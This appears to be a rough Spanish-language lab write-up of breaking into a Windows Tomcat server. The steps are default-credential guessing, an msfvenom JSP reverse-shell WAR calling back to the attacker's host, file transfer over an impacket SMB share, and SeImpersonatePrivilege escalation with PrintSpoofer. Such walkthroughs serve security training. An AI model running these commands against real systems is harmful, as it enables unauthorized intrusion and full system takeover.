<!--

Writeup

netdiscover -> 192.168.1.74

first nmap -> 

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

No está el 9585 ni 9586 (WINRM) pero lo añadiremos a la lista para el segundo nmap

second nmap ->




8080->
Probar creds default 
admin:admin
admin:password
tomcat:tomcat
tomcat:admin
catalina:admin
catalina:catalina
catalina:tomcat
tomcat:s3cure
admin:tomcat -> BINGO!


vemos diferentes posibles archivos que nos servirán en la página general

imagen catalina

Páginas que requieren login y otras que te dan error de autorizacion como /docs/*
catalina no es un posible usuario: https://www.baeldung.com/tomcat-deploy-war
explicacion war, deploys y demas

Aún habiendo logueado, a estos directorios seguimos sin poder entrar

BUEN CAMINO
deploy una reverse shell .war con msfvenom
Explicar .war y los parámetros 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.12 LPORT=445 -f war > reverseShell.war

Vemos los permisos
image
Y vemos que tiene uno en especial
El permiso SeImpersonatePrivilege, conocido como "Impersonar a un cliente después de la autenticación", es un privilegio especial en sistemas Windows que permite a un proceso asumir la identidad de otro proceso o usuario, con el objetivo de actuar en su nombre.

SeImpersonatePrivilege
This is privilege that is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges. This vulnerability can be exploited using various tools, such as juicy-potato, RogueWinRM (which requires winrm to be disabled), SweetPotato, and PrintSpoofer.

https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
https://jlajara.gitlab.io/Potatoes_Windows_Privesc

Descagrar en %TEMP% (CMD) o en $env:TEMP (powershell)
	no me ha dejado ni wget ni curl con un servicio http, por lo que lo mandaremos con un servicio smb
	kali:
		impacket-smbserver shared . -smb2support
	victima:
		cp //192.168.1.12/shared/* 


No ha dejado con RogueWinRM.exe, ha sido con PrinSpoofer.exe

	RogueWinRM.exe -p powershell.exe
	
	PrintSpoofer.exe -i -c powershell.exe
	
Obtenemos acceso con system (system > administrator) y obtenemos las dos flags


MAL CAMINO
Hay una opcion de deploy, en la que podemos "deployear" un archivo war o un DIRECTOIO, en esto vamos a intentar deployear este /docs/ (no deja archivos locales del sistema). Si nos fijamos, e intentamos hacerlo con /docs nos deja deployear, pero nos sale el mismo error que antes. En la página principal, vemos otro directorio que nos puede ser interesante /docs/config, por lo que intentamos deployearlo tambien

imagen deploy

Ninguno de los enlaces nos redirecciona bien, pero ya sabemos como hacer el deploy, asique vamos a deployear cada uno que veamos interesante










-->
